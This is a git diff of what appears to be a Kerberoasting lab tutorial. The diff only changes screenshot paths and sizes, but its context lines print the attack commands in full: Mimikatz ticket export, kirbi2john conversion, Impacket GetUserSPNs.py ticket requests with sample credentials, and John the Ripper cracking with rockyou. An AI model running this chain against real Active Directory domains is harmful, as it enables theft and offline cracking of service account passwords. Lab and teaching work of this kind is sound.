@@ -90,21 +90,21 @@ download script:https://raw.githubusercontent.com/cyberark/RiskySPN/master/Get-T
 
  
  ## Mimikatz
-  <img src="/img/kerberosting/14.PNG" alt="Getting-gz" width="800" height="200"> 
+  <img src="/img/kerberosting/m1.PNG" alt="Getting-gz" width="800" height="200"> 
 
  ```
  Kerberos::list  ## for SPN discovery.
  ```
-  <img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="800" height="200"> 
+  <img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="800" height="200"> 
 
 Dump TGS ticket
 ```
 kerberos::list /export
 
 ```
- <img src="/img/kerberosting/3.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/kerberosting/m2.PNG" alt="Getting-gz" width="800" height="200"> 
 
- <img src="/img/kerberosting/4.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/kerberosting/m3.PNG" alt="Getting-gz" width="800" height="200"> 
 
 
 ## kirbi2john.py 
@@ -113,7 +113,7 @@ Convert the Kirbi to Hash
 ```
 kirbi2john.py 3-40a50000-admin@ldap\~domainAD.karim.net\~DomainDnsZones.karim.net-KARIM.NET.kirbi
 ```
- <img src="/img/kerberosting/222222.PNG" alt="Getting-gz" width="800" height="200"> 
+ <img src="/img/kerberosting/222222.PNG" alt="Getting-gz" width="1000" height="300"> 
  
 
 ## GetUserSPNs.py
@@ -121,7 +121,7 @@ find user account used as service account
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 
 ```
-<img src="/img/kerberosting/1.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request     
@@ -135,19 +135,18 @@ if you find this error from Linux: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock 
 sudo ntpdate  192.168.128.140
 ```
 
-<img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/err2.PNG" alt="Getting-gz" width="1000" height="200"> 
 
   
 ```
 python3 GetUserSPNs.py karim.net/admin:p@ssw0rd -dc-ip 192.168.128.140 -request-user websvc
 ```
   
-<img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/2.PNG" alt="Getting-gz" width="1000" height="300"> 
 
-  
   
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt tgs
 ```
   
-<img src="/img/kerberosting/john.PNG" alt="Getting-gz" width="800" height="200"> 
+<img src="/img/kerberosting/john.PNG" alt="Getting-gz" width="1000" height="200"> 
